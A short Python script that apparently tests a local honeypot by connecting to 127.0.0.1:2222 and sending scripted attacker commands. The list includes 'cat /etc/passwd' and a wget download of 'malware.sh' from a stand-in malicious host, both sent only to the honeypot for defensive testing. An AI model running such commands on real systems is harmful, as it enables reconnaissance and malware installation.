import socket
import time

def run_attacker(commands):
    print("[+] Connecting to Honeypot on port 2222...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 2222))
        
        # Read welcome message
        time.sleep(0.3)
        welcome = s.recv(4096).decode()
        print(f"Honeypot Welcome:\n{welcome}")
        
        for cmd in commands:
            # Send command
            print(f"\nSending: {cmd}")
            s.sendall(f"{cmd}\n".encode())
            
            # Bounded sleep to wait for socket data
            time.sleep(0.8)
            resp = s.recv(4096).decode()
            print(f"Honeypot Output:\n{resp}")
            
        print("[+] Disconnecting...")
        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    commands = [
        "whoami",
        "pwd",
        "ls -la",
        "mkdir test_deception",
        "cd test_deception",
        "cat /etc/passwd",
        "wget http://malicious-site.com/malware.sh",
        "exit"
    ]
    run_attacker(commands)
